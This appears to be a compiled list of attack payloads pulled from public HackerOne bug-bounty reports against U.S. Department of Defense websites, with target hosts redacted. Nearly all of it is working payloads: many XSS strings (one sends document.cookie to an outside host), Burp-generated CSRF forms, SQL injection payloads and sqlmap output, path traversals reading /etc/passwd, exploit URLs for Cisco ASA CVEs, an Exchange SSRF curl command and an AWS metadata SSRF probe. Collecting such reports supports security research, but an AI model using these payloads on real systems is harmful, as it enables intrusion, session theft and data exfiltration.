— [Reflected XSS on ███████](https://hackerone.com/reports/1062380) · U.S. Dept Of Defense · [0x0d0](https://hackerone.com/0x0d0)

### `533624b4`

```
https://███████/███████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

**Parameter:** `sub_div_ofc_sym_cd`
— [Reflected XSS on https://█████████/](https://hackerone.com/reports/1065167) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `7628c1ba`

```
https://███████/█████████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

**Parameter:** `sub_div_ofc_sym_cd`
— [Reflected XSS on https://█████████/](https://hackerone.com/reports/1065167) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `280299d7`

```
</title><svg/onload=alert(domain)>
```

**Parameter:** `title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)

### `e55d49e6`

```
https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://target.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_36219
```

**Parameter:** `p_title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)

### `c8dcd7ae`

```
</title><script/src='https://target.com/hta3.js'>
```

**Parameter:** `p_title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)

### `b585e8c4`

```
2- When browsing here, `                                                                                                                                                                                                                                                                                                                                            ><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163
```

**Parameter:** `p_title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)

### `81aa312e`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://█████████" method="POST">
      <input type="hidden" name="ctl00&#95;ToolkitScriptManager1&#95;HiddenField" value="" />
      <input type="hidden" name="ctl00&#36;masterContentHolder&#36;wizardCreateNewUser&#36;CreateUserStepContainer&#36;textboxFirstName" value="df" />
      <input type="hidden" name="ctl00&#36;masterContentHolder&#36;wizardCreat
```

— [CSRF in  https://███](https://hackerone.com/reports/1090838) · U.S. Dept Of Defense · [blackangel11](https://hackerone.com/blackangel11)

### `5b9fab44`

```
https://███████████████%3CSvg%20OnLoad=alert(1
```

— [Reflected XSS In https://███████](https://hackerone.com/reports/1094276) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `3ba1ae0c`

```
https://██████████████████%3CSvg%20OnLoad=alert(1
```

— [Reflected XSS In https://███████](https://hackerone.com/reports/1094276) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `189c7eb0`

```
https://█████████/█████████CE399%22%3E%3C/script%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

— [Reflected XSS in https://██████████ via "████████" parameter](https://hackerone.com/reports/1095765) · U.S. Dept Of Defense · [nirajgautamit](https://hackerone.com/nirajgautamit)

### `6be125f9`

```
URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='
```

— [Blind SQL iNJECTION ](https://hackerone.com/reports/1102591) · U.S. Dept Of Defense · [1337n0x](https://hackerone.com/1337n0x)

### `64490c69`

```
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
```

— [Blind SQL iNJECTION ](https://hackerone.com/reports/1102591) · U.S. Dept Of Defense · [1337n0x](https://hackerone.com/1337n0x)

### `4c4dbc91`

````
2 - type the payload in the "First Name" input ```test";</script><script>alert(document.cookie)</script>
````

**Parameter:** `first_name`
— [Self XSS + CSRF Leads to Reflected XSS in https://████/ ](https://hackerone.com/reports/1109544) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `30de77df`

```
<input type="hidden" name="first&#95;name" value="test";</script><script>alert(document.cookie)</script>" />
```

**Parameter:** `first_name`
— [Self XSS + CSRF Leads to Reflected XSS in https://████/ ](https://hackerone.com/reports/1109544) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `72ad3742`

```
<input type="hidden" name="mail&#95;to&#95;first&#95;name" value="test&quot;&#59;&lt;&#47;script&gt;&lt;script&gt;alert&#40;&quot;HACKED&#32;BY&#32;Sleep&#32;NOt&#32;Found&quot;&#41;&lt;&#47;script&gt;" />
```

**Parameter:** `mail_to_first_name`
— [Self XSS + CSRF Leads to Reflected XSS in https://████/ ](https://hackerone.com/reports/1109544) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `faf68048`

```
2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="                         >/index.html?c=hemantsolo_xss" />
```

**Parameter:** `first_name`
— [Blind Stored XSS on ███████  leads to takeover admin account](https://hackerone.com/reports/1110243) · U.S. Dept Of Defense · [hemantsolo](https://hackerone.com/hemantsolo)

### `273c8f83`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████████/████" method="POST">
      <input type="hidden" name="████████&#45;building" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="██████████&#45;classroom" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <i
```

— [CSRF to Cross-site Scripting (XSS)](https://hackerone.com/reports/1118501) · U.S. Dept Of Defense · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `afc7f944`

```
curl -i -s -k -X $'GET' \
    -H $'Host: █████' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/l
```

— [CVE-2021-26855 on ████████ resulting in SSRF](https://hackerone.com/reports/1119228) · U.S. Dept Of Defense · [spongebhav](https://hackerone.com/spongebhav)

### `bf61cbd0`

```
https://████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [Path Traversal - \[ CVE-2020-3452 \]](https://hackerone.com/reports/1137321) · U.S. Dept Of Defense · [kmxx](https://hackerone.com/kmxx)

### `a86cc1e6`

```
"/><script>alert(1);</script>
```

— [xss reflected on https://███████- (███ parameters)](https://hackerone.com/reports/1143783) · U.S. Dept Of Defense · [fiveguyslover](https://hackerone.com/fiveguyslover)

### `b6dc25af`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://███/████████" method="POST">
      <input type="hidden" name="action" value="F█████" />
      <input type="hidden" name="token" value="████████" />
      <input type="hidden" name="frm&#95;email" value="nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="frm&#
```

**Parameter:** `frm_email`
— [CSRF Based XSS @ https://██████████](https://hackerone.com/reports/1147949) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `7133c1d3`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://█████/████████" method="POST">
      <input type="hidden" name="action" value="F███████" />
      <input type="hidden" name="token" value="███████" />
      <input type="hidden" name="frm&#95;email" value="nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="fr
```

**Parameter:** `frm_email`
— [CSRF Based XSS @ https://██████████](https://hackerone.com/reports/1147949) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `b6734404`

```
https://█████/████&url=http%3a%2f%2ftarget.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E
```

**Parameter:** `url`
— [Reflected XSS through clickjacking at https://████](https://hackerone.com/reports/1149144) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `1551a8a4`

```
https://████████/██████=javascript:alert(document.domain)
```

— [DOM Based XSS on https://████ via backURL param](https://hackerone.com/reports/1159255) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `777ca094`

```
https://█████/████=javascript:alert(document.domain)
```

— [DOM Based XSS on https://████ via backURL param](https://hackerone.com/reports/1159255) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `68e64f01`

```
<style>

div {
       position:absolute;
       top:200px;
       left:900px;
       
   }
 body {

 	background-image: url('1.png');
 	background-repeat: no-repeat;
 	background-position: 300px 5px;

 }
</style>

<iframe src="https://███████?URL=javascript:alert(document.domain)//%0D%0A&#x22;https://target.com" id="xxx" width=100% height=100% style="opacity: 0;"></iframe>
```

**Parameter:** `src`
— [Reflected XSS through ClickJacking](https://hackerone.com/reports/1171403) · U.S. Dept Of Defense · [sazouki](https://hackerone.com/sazouki)

### `a17e914f`

```
Browse to                                                                 "a='http%3a%2f%2f███';b='%3Fcookie=';c=btoa(document.cookie);window.open(a%2bb%2bc)">
```

— [Reflected XSS at www.███████ at /██████████ via the ████████ parameter](https://hackerone.com/reports/1173593) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)

### `af033d38`

```
GET █████████masterUrl=http://target.com HTTP/1.1
Host: www.███
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Accept-Language: en
Connection: close
Accept-Encoding: gzip
```

**Parameter:** `masterUrl`
— [ SSRF due to  CVE-2021-27905 in www.████████](https://hackerone.com/reports/1183472) · U.S. Dept Of Defense · [fdeleite](https://hackerone.com/fdeleite)

### `12f1050f`

```
3. Click the text button and inject : <iframe src="                 "></iframe>
```

— [XSS trigger via HTML Iframe injection in ( https://██████████ ) due to unfiltered HTML tags](https://hackerone.com/reports/1200770) · U.S. Dept Of Defense · [basant0x01](https://hackerone.com/basant0x01)

### `55edb077`

```
https://██████████/███onload=%22prompt(1)
```

**Parameter:** `path`
— [XSS Reflected - ██████████](https://hackerone.com/reports/1223577) · U.S. Dept Of Defense · [drauschkolb](https://hackerone.com/drauschkolb)

### `040d3058`

```
https://████████/██████onload=%22prompt(1
```

**Parameter:** `path`
— [XSS Reflected - ██████████](https://hackerone.com/reports/1223577) · U.S. Dept Of Defense · [drauschkolb](https://hackerone.com/drauschkolb)

### `c5274888`

```
SAMLResponse="><svg/onload=alert('xss')>
```

**Parameter:** `SAMLResponse`
— [███████ - XSS - CVE-2020-3580](https://hackerone.com/reports/1243650) · U.S. Dept Of Defense · [pr3r00t](https://hackerone.com/pr3r00t)

### `0019d9a1`

```
https://███/███=%3Cscript%3Ealert(document.domain
```

— [RXSS ON https://██████████](https://hackerone.com/reports/1244145) · U.S. Dept Of Defense · [iam_a_jinchuriki](https://hackerone.com/iam_a_jinchuriki)

### `e71a2f6d`

```
https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

— [XSS on https://████/ via ███████ parameter](https://hackerone.com/reports/1251868) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `7a23cbd2`

```
o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
```

— [XSS on https://████/ via ███████ parameter](https://hackerone.com/reports/1251868) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `4e96e34a`

```
https://█████/██████=████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

— [XSS on https://████/ via ███████ parameter](https://hackerone.com/reports/1251868) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `8db26d8b`

```
https://█████/██████████<img%20src=x%20onerror=alert()>
```

— [XSS on https://████████/████' parameter](https://hackerone.com/reports/1252020) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `42db3e83`

```
https://██████/███<img%20src=x%20onerror=alert()>
```

— [XSS on https://████████/████' parameter](https://hackerone.com/reports/1252020) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `eafb0452`

```
https://██████████/███████████=███████"><details%00open%00ontoggle=alert()>
```

— [XSS on https://██████/███ via █████ parameter](https://hackerone.com/reports/1252059) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `047f66cd`

```
Go to                                     "><details%00open%00ontoggle=alert()>
```

— [XSS on https://██████/███ via █████ parameter](https://hackerone.com/reports/1252059) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `1f3436de`

```
https://███="><script>alert(1)</script>
```

— [Reflected XSS - https://███](https://hackerone.com/reports/1260823) · U.S. Dept Of Defense · [fiveguyslover](https://hackerone.com/fiveguyslover)

### `37b300bf`

```
Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
```

— [SQL injection located in `███` in POST param `████████` ](https://hackerone.com/reports/1262757) · U.S. Dept Of Defense · [brumens](https://hackerone.com/brumens)

### `fba77dee`

```
https://██████████/██████=%3C/script%3E%3Cscript%3Ealert(document.domain
```

— [Reflected XSS on \[█████████\]](https://hackerone.com/reports/1267380) · U.S. Dept Of Defense · [saajanbhujel](https://hackerone.com/saajanbhujel)

### `8ea4158a`

```
██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E
```

— [Reflected XSS at ████ via ██████████= parameter ](https://hackerone.com/reports/1305472) · U.S. Dept Of Defense · [zhenwarx](https://hackerone.com/zhenwarx)

### `6b9fed88`

```
<img/src/onerror=alert(document.domain)>
```

— [Reflected XSS at ████ via ██████████= parameter ](https://hackerone.com/reports/1305472) · U.S. Dept Of Defense · [zhenwarx](https://hackerone.com/zhenwarx)

### `6b08d3d3`

```
██████████?█████=%253Cimg/src/onerror=alert(document.domain)%253E
```

— [Reflected XSS at ████ via ██████████= parameter ](https://hackerone.com/reports/1305472) · U.S. Dept Of Defense · [zhenwarx](https://hackerone.com/zhenwarx)

### `c767d58d`

```
http://███/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.location
```

**Parameter:** `where`
— [XSS because of Akamai ARL misconfiguration on ████](https://hackerone.com/reports/1305477) · U.S. Dept Of Defense · [pirneci](https://hackerone.com/pirneci)

### `b7100c48`

```
https://█████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
```

**Parameter:** `where`
— [Reflected XSS \[██████\]](https://hackerone.com/reports/1309385) · U.S. Dept Of Defense · [fdeleite](https://hackerone.com/fdeleite)

### `cbb66c25`

```
https://███████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
```

**Parameter:** `where`
— [Reflected XSS \[██████\]](https://hackerone.com/reports/1309386) · U.S. Dept Of Defense · [fdeleite](https://hackerone.com/fdeleite)

### `7cdca4ae`

```
http://████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

**Parameter:** `where`
— [Open Akamai ARL XSS at ████████](https://hackerone.com/reports/1317024) · U.S. Dept Of Defense · [whoisbinit](https://hackerone.com/whoisbinit)

### `4d90e40a`

```
https://█████████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

**Parameter:** `where`
— [Open Akamai ARL XSS at ████████](https://hackerone.com/reports/1317031) · U.S. Dept Of Defense · [whoisbinit](https://hackerone.com/whoisbinit)

### `f1ba9c33`

```
https://██████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

**Parameter:** `where`
— [Open Akamai ARL XSS at ████████](https://hackerone.com/reports/1317031) · U.S. Dept Of Defense · [whoisbinit](https://hackerone.com/whoisbinit)

### `8a918fe8`

```
https://██████████/██████/logout?service=javascript:alert(1
```

**Parameter:** `service`
— [Rxss on █████████ via logout?service=javascript:alert(1)](https://hackerone.com/reports/1406598) · U.S. Dept Of Defense · [m00n_knight](https://hackerone.com/m00n_knight)

### `4ffa6873`

```
https://██████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [\[CVE-2020-3452\] Unauthenticated file read in Cisco ASA](https://hackerone.com/reports/1415825) · U.S. Dept Of Defense · [b4dc4t](https://hackerone.com/b4dc4t)

### `3056fe84`

```
https://████████/█████████████████=%22%3E%3Csvg/onload=alert(1
```

— [Reflected XSS at https://██████/██████ via "██████" parameter](https://hackerone.com/reports/1457444) · U.S. Dept Of Defense · [pelegn](https://hackerone.com/pelegn)

### `4a631b15`

```
https://████████/████████████████████████=%22%3E%3Csvg/onload=alert(1
```

— [Reflected XSS at https://██████/██████ via "██████" parameter](https://hackerone.com/reports/1457444) · U.S. Dept Of Defense · [pelegn](https://hackerone.com/pelegn)

### `9531ea8b`

```
<img src=%3d onerror%3dalert(document.cookie)
```

— [Reflected XSS via `████████` parameter](https://hackerone.com/reports/1536215) · U.S. Dept Of Defense · [mdakh404](https://hackerone.com/mdakh404)

### `10d9938c`

```
<img src%3dx onerror%3dalert(document.cookie>
```

— [Reflected XSS via `████████` parameter](https://hackerone.com/reports/1536215) · U.S. Dept Of Defense · [mdakh404](https://hackerone.com/mdakh404)

### `4894390c`

```
https://█████████/████████=/etc/passwd
```

— [lfi in filePathDownload parameter via ███████](https://hackerone.com/reports/1542734) · U.S. Dept Of Defense · [exploitmsf](https://hackerone.com/exploitmsf)

### `4e54763b`

```
https://█████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [\[CVE-2020-3452\] Unauthenticated file read in Cisco ASA](https://hackerone.com/reports/1555015) · U.S. Dept Of Defense · [b4dc4t](https://hackerone.com/b4dc4t)

### `cf3da9b8`

```
curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif"
```

**Parameter:** `token`
— [CVE-2020-3187 - Unauthenticated Arbitrary File Deletion](https://hackerone.com/reports/1555025) · U.S. Dept Of Defense · [b4dc4t](https://hackerone.com/b4dc4t)

### `52d966a2`

```
<input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
```

**Parameter:** `SAMLResponse`
— [XSS DUE TO CVE-2020-3580](https://hackerone.com/reports/1606068) · U.S. Dept Of Defense · [cruxn3t](https://hackerone.com/cruxn3t)

### `4bc9a48a`

```
<svg/onload=confirm(document.cookie)>
```

— [Stored XSS at https://█████](https://hackerone.com/reports/1620247) · U.S. Dept Of Defense · [k0shane](https://hackerone.com/k0shane)

### `077699a0`

```
https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
```

**Parameter:** `url`
— [SSRF to read AWS metaData at https://█████/ \[HtUS\]](https://hackerone.com/reports/1624140) · U.S. Dept Of Defense · [rohsec](https://hackerone.com/rohsec) · $1,000.0

### `ac0500ea`

```
https://██████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain
```

**Parameter:** `CurrentFolder`
— [\[████████\] RXSS via "CurrentFolder" parameter](https://hackerone.com/reports/1624267) · U.S. Dept Of Defense · [qu1nten](https://hackerone.com/qu1nten)

### `ffbe1b45`

```
https://██████████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain
```

**Parameter:** `CurrentFolder`
— [\[████████\] RXSS via "CurrentFolder" parameter](https://hackerone.com/reports/1624267) · U.S. Dept Of Defense · [qu1nten](https://hackerone.com/qu1nten)

### `21987dea`

```
Parameter: scn (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0
```

**Parameter:** `scn`
— [SQL injection at \[█████████\] \[HtUS\]](https://hackerone.com/reports/1626198) · U.S. Dept Of Defense · [malcolmx](https://hackerone.com/malcolmx)

### `77587dfd`

```
https://████████/download.php?filePathDownload=data_products/../../../../../etc/passwd
```

**Parameter:** `filePathDownload`
— [Local file read at https://████/ \[HtUS\]](https://hackerone.com/reports/1626210) · U.S. Dept Of Defense · [sudi](https://hackerone.com/sudi)

### `e348b8dd`

```
https://█████/download.php?filePathDownload=data_products/../download.php
```

**Parameter:** `filePathDownload`
— [Local file read at https://████/ \[HtUS\]](https://hackerone.com/reports/1626210) · U.S. Dept Of Defense · [sudi](https://hackerone.com/sudi)

### `cb95bdd7`

```
GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers
```

**Parameter:** `id`
— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `fe136867`

```
GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers
```

**Parameter:** `id`
— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `4e950769`

```
'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa
```

— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `0daa83f7`

```
'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa
```

— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `79284bb5`

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="█████/registration/my-account.cfm" method="POST">
      <input type="hidden" name="cmdSubmit" value="Update&#32;My&#32;Account" />
      <input type="hidden" name="txtFirstname" value="fname" />
      <input type="hidden" name="txtMI" value="hi" />
      <input type="hidden" name="txtLastname" value="lnames" />
      <input type="hidden" name="txtAddress" value="hello" />
      <input type="hidden" name="optAddre
```

— [Account Takeover and Information update due to cross site request forgery via POST █████████/registration/my-account.cfm](https://hackerone.com/reports/1626356) · U.S. Dept Of Defense · [snifyak](https://hackerone.com/snifyak)

### `e680f7b2`

```
https://www.████████/Download.aspx?id=4675
```

**Parameter:** `id`
— [IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers via https://www.█████████/Download.aspx?id= \[HtUS\]](https://hackerone.com/reports/1626508) · U.S. Dept Of Defense · [berserker22](https://hackerone.com/berserker22) · $500.0

### `de80ddfa`

```
https://www.█████████/Download.aspx?id=4675
```

**Parameter:** `id`
— [IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers via https://www.█████████/Download.aspx?id= \[HtUS\]](https://hackerone.com/reports/1626508) · U.S. Dept Of Defense · [berserker22](https://hackerone.com/berserker22) · $500.0

### `3b892181`

```
POST /contact-us/ HTTP/1.1
Host: ███████
Cookie: wire=kh92hb67grih1376an7igoeo39; _ga_877MBKEB9K=GS1.1.1657044258.1.1.1657044351.0; _ga=GA1.2.58467857.1657044259; __atuvc=2%7C27; __atuvs=62c47d237cd3f8d9001; __atrfs=ab/|pos/|tot/|rsi/62c47d0400000000|cfc/|hash/0|rsiq/|fuid/d2cfdda4|rxi/|rsc/addressbar|gen/1|csi/|dr/; _gid=GA1.2.2089900381.1657044260; wires=cqr7lhfhfudpdntime6mevkslt; _gat_gtag_UA_377760_26=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accep
```

**Parameter:** `name`
— [RXSS on ███████](https://hackerone.com/reports/1626962) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)

### `4f76b69f`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████/contact-us/" method="POST">
      <input type="hidden" name="name" value="&quot;&#32;onfocus&#61;alert&#40;&apos;tmz900&apos;&#41;&#32;autofocus&#47;&#47;&quot;" />
      <input type="hidden" name="email" value="test&#64;gmail&#46;com" />
      <input type="hidden" name="phone" value="1234567895" />
      <input type="hidden" name="message" v
```

**Parameter:** `name`
— [RXSS on ███████](https://hackerone.com/reports/1626962) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)

### `5d8322f5`

```
https://██████/SA1/SAReplay/default.asp?WhatSubmitted=Empty%22;-alert(%27tmz900%27
```

**Parameter:** `WhatSubmitted`
— [RXSS on █████████](https://hackerone.com/reports/1627616) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)

### `7a6f69a7`

```
https://████████/SA1/SAReplay/default.asp?WhatSubmitted=Empty%22;-alert(%27tmz900%27
```

**Parameter:** `WhatSubmitted`
— [RXSS on █████████](https://hackerone.com/reports/1627616) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)

### `ba098aef`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████/users/user" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

— [CSRF to delete accounts \[HtUS\]](https://hackerone.com/reports/1629828) · U.S. Dept Of Defense · [nightm4re](https://hackerone.com/nightm4re)

### `0cc2308b`

```
svg/onload=alert(1)>
```

— [STORED XSS in █████████/nlc/login.aspx via "edit" GET parameter through markdown editor \[HtUS\]](https://hackerone.com/reports/1631447) · U.S. Dept Of Defense · [shreky](https://hackerone.com/shreky)

### `9906a525`

```
https://███████.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd
```

**Parameter:** `filePathDownload`
— [Local File Inclusion in download.php](https://hackerone.com/reports/1639364) · U.S. Dept Of Defense · [tokyoenigma](https://hackerone.com/tokyoenigma)

### `4149095a`

```
https://███.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd
```

**Parameter:** `filePathDownload`
— [Local File Inclusion in download.php](https://hackerone.com/reports/1639364) · U.S. Dept Of Defense · [tokyoenigma](https://hackerone.com/tokyoenigma)

### `7ed3ab29`

```
https://████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [Reflected XSS at https://██████/](https://hackerone.com/reports/1681178) · U.S. Dept Of Defense · [testingforbugs](https://hackerone.com/testingforbugs)

### `b46b406d`

```
https://█████████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [XSS DUE TO CVE-2022-38463 in https://████████](https://hackerone.com/reports/1681208) · U.S. Dept Of Defense · [shuvam321](https://hackerone.com/shuvam321)

### `c45de0fb`

```
http://127.0.0.1/test.png
```

— [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501) · U.S. Dept Of Defense · [696e746c6f6c](https://hackerone.com/696e746c6f6c)

### `c4445d64`

```
https://127.0.0.1/
```

